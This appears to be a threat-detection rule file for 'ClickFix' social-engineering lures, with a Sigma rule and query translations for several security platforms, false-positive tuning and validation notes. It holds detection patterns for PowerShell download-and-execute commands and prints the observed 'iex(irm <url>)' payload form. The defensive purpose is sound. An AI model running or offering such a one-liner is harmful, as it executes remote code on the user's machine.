---
id: DET-0002
title: "ClickFix PowerShell IRM Execution"
type: detection
status: validated
confidence: high
attack_tactics: [execution, initial-access]
attack_techniques: [T1059.001, T1204.001]
platforms: [sigma, elastic, splunk, kql, crowdstrike]
data_sources: [process_creation, script_block_logging]
lolbin: []
false_positive_rate: low
related_hunts: ["[[HUNT-0005 - ClickFix WordPress Delivery Network Hunt]]"]
references:
  - "https://attack.mitre.org/techniques/T1059/001/"
  - "https://attack.mitre.org/techniques/T1204/001/"
created: 2026-07-11
updated: 2026-07-11
tags: [detection, clickfix, powershell, execution]
---

# ClickFix PowerShell IRM Execution

## Logic summary
ClickFix social engineering lures instruct victims to paste a PowerShell one-liner into the Run dialog or a terminal. The canonical payload combines `Invoke-RestMethod` (`irm`) to fetch a remote script and `Invoke-Expression` (`iex`) to execute it in-memory, bypassing file-based AV at the download stage. This detection flags the `iex(irm ...)` pattern in process command-line telemetry. Benign volume for this combination is near-zero in standard enterprise environments; the pattern is almost exclusively associated with malicious loaders.

Validated against real-world ClickFix campaigns (EVALUSION/UNC2190 cluster) delivering NetSupport RAT.

## Sigma (canonical)
```yaml
title: ClickFix PowerShell IRM Execution
id: 8171b3c4-8e4a-4f78-ade7-3a0698cda3f3
status: test
author: Justice Hammer
date: 2026-07-11
description: >
  Detects PowerShell combining Invoke-RestMethod (irm) and Invoke-Expression (iex)
  to download and execute a remote payload in-memory — the canonical ClickFix
  one-liner delivery pattern.
logsource:
  category: process_creation
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_cmd:
    CommandLine|contains|all:
      - 'irm '
      - 'iex'
  selection_cmd_alt:
    CommandLine|contains|all:
      - 'Invoke-RestMethod'
      - 'Invoke-Expression'
  selection_url:
    CommandLine|contains:
      - 'http://'
      - 'https://'
  condition: selection_proc and (selection_cmd or selection_cmd_alt) and selection_url
falsepositives:
  - Legitimate admin scripts fetching and executing from PSGallery or winget wrappers
  - Scope to non-admin accounts or filter on parent process (explorer.exe, browser) to target user-initiated execution
level: high
tags:
  - attack.execution
  - attack.initial_access
  - attack.t1059.001
  - attack.t1204.001
```

## Platform translations
### Elastic (ES|QL)
```sql
FROM logs-endpoint.events.process-*
| WHERE event.category == "process" AND event.type == "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe")
| WHERE process.command_line LIKE "*irm *iex*"
    OR process.command_line LIKE "*Invoke-RestMethod*Invoke-Expression*"
| WHERE process.command_line LIKE "*http*"
| KEEP @timestamp, host.name, process.parent.name, process.command_line, user.name
| SORT @timestamp DESC
```
### Splunk (SPL)
```
`process_creation`
  (process_name IN ("powershell.exe","pwsh.exe"))
  ((CommandLine="*irm *" AND CommandLine="*iex*") OR (CommandLine="*Invoke-RestMethod*" AND CommandLine="*Invoke-Expression*"))
  (CommandLine="*http*")
| table _time host user parent_process CommandLine
```
### Microsoft (KQL)
```kql
DeviceProcessEvents
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any ("irm ", "Invoke-RestMethod")
    and ProcessCommandLine has_any ("iex(", "iex (", "Invoke-Expression")
    and ProcessCommandLine has_any ("http://", "https://")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, ProcessCommandLine
| sort by Timestamp desc
```
### CrowdStrike (LogScale)
```
#event_simpleName=ProcessRollup2
  ImageFileName=/\\(powershell|pwsh)\.exe$/i
  CommandLine=/irm\s|Invoke-RestMethod/i
  CommandLine=/iex[\s(]|Invoke-Expression/i
  CommandLine=/https?:\/\//i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, CommandLine])
```

## False positives
- Legitimate `irm`+`iex` usage in admin bootstrap scripts (PSGallery module install, winget wrappers, internal tooling).
- Tune by filtering on `InitiatingProcessFileName`: legitimate admin usage typically parents from `svchost.exe` or a scheduled task; ClickFix targets user-initiated sessions parented from `explorer.exe` or a browser.
- Scope to non-privileged accounts to reduce admin noise without losing the signal.

## Validation notes
Validated against EVALUSION/UNC2190 ClickFix campaigns delivering NetSupport RAT. Observed payload form: `powershell -c "iex(irm '<url>' -UseBasicParsing)"` with clipboard paste via Win+R Run dialog. Benign baseline volume near-zero on standard workstation fleets when scoped to non-admin user context.

## References
- https://attack.mitre.org/techniques/T1059/001/
- https://attack.mitre.org/techniques/T1204/001/
